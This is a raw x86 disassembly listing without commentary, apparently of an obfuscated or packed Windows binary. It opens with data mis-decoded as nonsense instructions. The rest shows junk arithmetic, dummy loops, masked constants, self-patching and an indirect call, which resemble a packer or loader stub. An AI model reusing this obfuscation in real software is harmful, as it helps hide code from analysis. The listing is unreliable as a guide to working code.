  40b039:	inc    ebx
  40b03a:	psubusw mm0,QWORD PTR [ebx]
  40b03d:	cli    
  40b03e:	mov    edx,0x95367fe1
  40b043:	in     eax,dx
  40b044:	(bad)  
  40b045:	cmp    DWORD PTR [edx-0x25a47909],ebp
  40b04b:	mov    bl,0xda
  40b04d:	mov    ebp,0xff03b226
  40b052:	cmp    esp,DWORD PTR [ebx+0x48]
  40b055:	xchg   edx,eax
  40b056:	mov    ebp,0x409f3d5d
  40b05b:	jmp    0x97e4f122
  40b060:	(bad)  
  40b061:	xor    al,BYTE PTR fs:[eax]
  40b064:	pop    edx
  40b065:	adc    ah,cl
  40b067:	adc    DWORD PTR [ebx],0x75
  40b06a:	jg     0x40b0bf
  40b06c:	(bad)  
  40b06d:	lods   al,BYTE PTR gs:[esi]
  40b06f:	adc    al,0xf7
  40b071:	es (bad) 
  40b073:	into   
  40b074:	scas   al,BYTE PTR es:[edi]
  40b075:	inc    edi
  40b076:	xchg   ecx,eax
  40b077:	fidivr WORD PTR [ecx+0x31866a2c]
  40b07d:	or     esp,DWORD PTR [ecx+0x535c69ab]
  40b083:	sahf   
  40b084:	pop    eax
  40b085:	jb     0x40b021
  40b087:	mov    DWORD PTR [eax],esi
  40b089:	je     0x40b01b
  40b08b:	mov    ecx,0x281cdc8
  40b090:	add    DWORD PTR [esi],esi
  40b092:	daa    
  40b093:	jns    0x40b094
  40b095:	xchg   ebx,eax
  40b096:	cmp    DWORD PTR [esi],ebp
  40b098:	push   edx
  40b099:	sbb    edx,DWORD PTR [edx+esi*4+0x2f]
  40b09d:	inc    ebx
  40b09e:	bound  eax,QWORD PTR [esi+eax*4]
  40b0a1:	ret    0x2743
  40b0a4:	aam    0x3b
  40b0a6:	xchg   edx,eax
  40b0a7:	(bad)  
  40b0a8:	xchg   ecx,eax
  40b0a9:	popf   
  40b0aa:	jae    0x40b0dd
  40b0ac:	or     edi,DWORD PTR [ebp+ebp*8+0x9b542fa]
  40b0b3:	test   BYTE PTR [ebp+0x1f13f360],bl
  40b0b9:	and    edi,DWORD PTR [edx-0x3795904f]
  40b0bf:	retfw  
  40b0c1:	pop    ebp
  40b0c2:	and    eax,0x7
  40b0c5:	mov    cl,0xa5
  40b0c7:	cmp    BYTE PTR [edi],bl
  40b0c9:	lea    esi,[edx-0x76fca9e9]
  40b0cf:	(bad)
  40b0d3:	inc    esp
  40b0d4:	std    
  40b0d5:	inc    esp
  40b0d6:	shr    BYTE PTR [esi-0x74],cl
  40b0d9:	(bad)  
  40b0da:	push   cs
  40b0db:	imul   esp,eax,0xffffff8a
  40b0de:	outs   dx,BYTE PTR ds:[esi]
  40b0df:	rcl    DWORD PTR [eax-0x5e],0x0
  40b0e3:	jae    0x40b07b
  40b0e5:	cdq    
  40b0e6:	daa    
  40b0e7:	pop    esp
  40b0e8:	outs   dx,BYTE PTR ds:[esi]
  40b0e9:	ins    BYTE PTR es:[edi],dx
  40b0ea:	sub    esp,DWORD PTR [ebx+0x34]
  40b0ed:	cmp    eax,0x8f2ec24a
  40b0f2:	je     0x40b136
  40b0f4:	jge    0x40b0eb
  40b0f6:	add    BYTE PTR [esp+esi*2],ch
  40b0f9:	pop    esi
  40b0fa:	cmp    bl,BYTE PTR [esi+0x6d]
  40b0fd:	fist   WORD PTR [eax-0x349cffee]
  40b103:	jge    0x40b180
  40b105:	xchg   esi,eax
  40b106:	dec    esp
  40b107:	es loop 0x40b120
  40b10a:	xchg   edi,eax
  40b10b:	shl    ebp,1
  40b10d:	mov    ch,BYTE PTR [ebx]
  40b10f:	add    DWORD PTR [edi],esp
  40b111:	sbb    ebx,DWORD PTR [ebp-0x52]
  40b114:	(bad)  [edx+0x40]
  40b117:	nop
  40b118:	push   es
  40b119:	jno    0x40b16b
  40b11b:	jl     0x40b19c
  40b11d:	mov    edi,DWORD PTR [edi-0x59]
  40b120:	shl    DWORD PTR [ebp-0x59812c11],1
  40b126:	shr    esi,1
  40b128:	push   esp
  40b129:	jmp    0xf14b294f
  40b12e:	out    0xa4,al
  40b130:	stc    
  40b131:	sbb    esi,DWORD PTR [edi+0x55]
  40b134:	ret    0xe5fb
  40b137:	imul   eax,esp,0x66583153
  40b13d:	fs fs out dx,al
  40b140:	icebp  
  40b141:	and    BYTE PTR [ebp-0x5f54df67],bh
  40b147:	mov    al,gs:0xc4fde264
  40b14d:	popa   
  40b14e:	aad    0x5c
  40b150:	push   ds
  40b151:	(bad)  
  40b152:	aad    0x26
  40b154:	outs   dx,BYTE PTR ds:[esi]
  40b155:	xchg   edx,eax
  40b156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b157:	xchg   ebp,eax
  40b158:	adc    al,0x72
  40b15a:	jmp    0x40b0ea
  40b15c:	sub    dh,BYTE PTR [esi+ebp*8+0x7a]
  40b160:	mov    ebp,0x84b684f9
  40b165:	dec    edx
  40b166:	mov    eax,ds:0x59031128
  40b16b:	loopne 0x40b1ab
  40b16d:	mov    dh,0x44
  40b16f:	dec    edx
  40b170:	sub    BYTE PTR [esi-0x2a9006c4],bh
  40b176:	inc    ebp
  40b177:	xchg   edx,eax
  40b179:	pusha  
  40b17a:	loopne 0x40b1f6
  40b17c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b17e:	daa    
  40b17f:	out    dx,al
  40b180:	lea    ebp,[ebp-0x1506e3d0]
  40b186:	push   ds
  40b187:	repnz scas eax,DWORD PTR es:[edi]
  40b189:	mov    eax,ds:0xe065f51
  40b18e:	jne    0x40b158
  40b190:	or     esi,ebx
  40b192:	mov    ecx,0x1be82235
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
